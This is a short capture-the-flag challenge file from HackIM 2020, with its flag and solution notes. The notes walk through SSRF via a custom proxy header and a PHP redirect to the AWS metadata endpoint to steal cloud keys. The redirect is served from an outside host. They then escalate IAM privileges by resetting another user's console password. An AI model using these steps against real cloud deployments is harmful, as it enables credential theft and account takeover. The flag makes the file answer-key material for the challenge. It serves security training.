# name:Lateral Movement 
description:  

* Bruteforce required

# flag: hackim20{Hail_RhinoSecurity_labs!!!!}

# solution
- SSRF via X-Tunnel-To Header with 303 Redirect in /api/1/something
  - curl localhost:3000/a -X GET -H "X-Tunnel-To: defmax.io\redirect.php?a=303
  - Redirect.php
    <?php
      header("http://169.254.169.254/",true,$_GET['a'])
    ?>
-The / is a full proxy, If you send a PUT, it sends PUT to proxy. This can be used to retrieve AWS keys.
- Now we need to privilege escalate ourselfs, Tools of rhino wont work here because I am giving access to IAM:ListPolicy
- The attacker should do a smart bruteforce, Where only 15 functions which can let users escalate themselfves
- aws iam list-users -> List users -> Find poorUser -> Update password using update-login profile
  - aws iam update-login-profile --user-name poorUser --password 'password'  
- The login sso link would be https://[accountID].signin.aws.amazon.com/console. The account can be retrived from arn, by calling aws stg get-caller-identity
- After login, Naviaget to S3 nullcon2020 Bucket to get the flag.


#Installation

- ./start.sh
